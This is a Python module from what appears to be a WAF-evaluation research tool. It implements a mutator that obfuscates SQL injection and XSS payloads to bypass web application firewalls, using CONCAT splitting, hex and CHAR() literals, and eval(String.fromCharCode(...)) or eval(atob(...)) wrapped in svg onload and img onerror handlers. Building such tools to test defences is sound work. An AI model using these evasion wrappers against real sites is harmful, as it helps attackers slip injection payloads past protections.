"""Structural obfuscation mutator.

Implements prompt.md §7(3) — string concatenation (``CONCAT('SEL','ECT')``),
``eval()`` reconstruction, char-code assembly (``String.fromCharCode``). Paper
complexity rank 3; baseline bypass rate ≈46%.

The variants fall into two families depending on payload class:

SQLi:
  - concat_keywords:  SELECT → CONCAT('SEL','ECT')
  - concat_all_strs:  every 'literal' → CONCAT('lit','eral')
  - hex_strings:      'admin' → 0x61646d696e (MySQL hex literal)
  - char_fn:          'admin' → CHAR(97,100,109,105,110)
  - concat_plus_hex:  stacked variant

XSS / JS-context:
  - fromcharcode:     alert(1) → eval(String.fromCharCode(...))
  - atob_eval:        base64 decode + eval reconstruction
  - concat_string:    "aler" + "t(1)"
  - template_literal: `al${''}ert(1)` (JS template break-up)
  - fromcharcode_svg: wrap the fromCharCode reconstruction in an <svg onload>

Non-JS / non-SQL classes (cmdi/lfi/ssti/xxe) fall back to generic string
concatenation tricks where applicable; otherwise the mutator emits structural
markers that are still interesting inputs for the WAF even if the target
app can't actually execute them.
"""
from __future__ import annotations

import re

from wafeval.models import MutatedPayload, Payload, VulnClass
from wafeval.mutators.base import Mutator, register

_SQL_KW_TO_CONCAT = {
    "SELECT", "UNION", "FROM", "WHERE", "UPDATE", "DELETE", "INSERT",
}
_KW_RE = re.compile(r"\b(" + "|".join(_SQL_KW_TO_CONCAT) + r")\b", re.IGNORECASE)
_STRING_LITERAL_RE = re.compile(r"'([^']{2,})'")


def _concat_keyword(kw: str) -> str:
    mid = len(kw) // 2
    return f"CONCAT('{kw[:mid]}','{kw[mid:]}')"


def _concat_keywords_in(text: str) -> str:
    return _KW_RE.sub(lambda m: _concat_keyword(m.group(0)), text)


def _concat_literals(text: str) -> str:
    def _split(m: re.Match) -> str:
        s = m.group(1)
        mid = len(s) // 2
        return f"CONCAT('{s[:mid]}','{s[mid:]}')"
    return _STRING_LITERAL_RE.sub(_split, text)


def _hex_literals(text: str) -> str:
    def _hex(m: re.Match) -> str:
        s = m.group(1)
        hx = s.encode("ascii", errors="ignore").hex()
        return f"0x{hx}"
    return _STRING_LITERAL_RE.sub(_hex, text)


def _char_fn_literals(text: str) -> str:
    def _cf(m: re.Match) -> str:
        s = m.group(1)
        return "CHAR(" + ",".join(str(ord(c)) for c in s) + ")"
    return _STRING_LITERAL_RE.sub(_cf, text)


def _js_fromcharcode(text: str) -> str:
    codes = ",".join(str(ord(c)) for c in text)
    return f"<svg onload=eval(String.fromCharCode({codes}))>"


def _js_atob_eval(text: str) -> str:
    import base64
    b = base64.b64encode(text.encode()).decode()
    return f"<img src=x onerror=\"eval(atob('{b}'))\">"


def _js_concat_string(text: str) -> str:
    if len(text) < 4:
        return text
    mid = len(text) // 2
    return f"{text[:mid]!r}+{text[mid:]!r}"


def _js_template_break(text: str) -> str:
    # Break up the first keyword-ish word with `${''}` interpolation holes.
    m = re.search(r"[A-Za-z]{4,}", text)
    if not m:
        return text
    word = m.group(0)
    mid = len(word) // 2
    break_point = word[:mid] + "${''}" + word[mid:]
    return text[:m.start()] + "`" + break_point + "`" + text[m.end():]


@register
class StructuralMutator(Mutator):
    category = "structural"
    complexity_rank = 3

    def mutate(self, payload: Payload) -> list[MutatedPayload]:
        body = payload.payload
        is_sqli = payload.vuln_class is VulnClass.SQLI
        is_xss = payload.vuln_class is VulnClass.XSS

        if is_sqli:
            variants = [
                ("concat_keywords", _concat_keywords_in(body)),
                ("concat_string_literals", _concat_literals(body)),
                ("hex_string_literals", _hex_literals(body)),
                ("char_fn_literals", _char_fn_literals(body)),
                ("stacked_concat_hex", _hex_literals(_concat_keywords_in(body))),
            ]
        elif is_xss:
            variants = [
                ("fromcharcode_svg", _js_fromcharcode(body)),
                ("atob_eval_img", _js_atob_eval(body)),
                ("string_concat", _js_concat_string(body)),
                ("template_break", _js_template_break(body)),
                ("fromcharcode_payload_only", f"eval(String.fromCharCode("
                 + ",".join(str(ord(c)) for c in body) + "))"),
            ]
        else:
            # cmdi / lfi / ssti / xxe — no first-class structural trick.
            # Fall back to literal-splitting + JS char-code wrappers; mostly
            # produces "novel shape" inputs for WAF-side inspection.
            variants = [
                ("literal_split_quote", _concat_literals(f"'{body}'")),
                ("hex_wrap", _hex_literals(f"'{body}'")),
                ("char_fn_wrap", _char_fn_literals(f"'{body}'")),
                ("js_string_concat", _js_concat_string(body)),
                ("js_fromcharcode", _js_fromcharcode(body)),
            ]

        return [
            MutatedPayload(
                source_id=payload.id,
                variant=tag,
                mutator=self.category,
                complexity_rank=self.complexity_rank,
                body=mutated,
            )
            for tag, mutated in variants
        ]
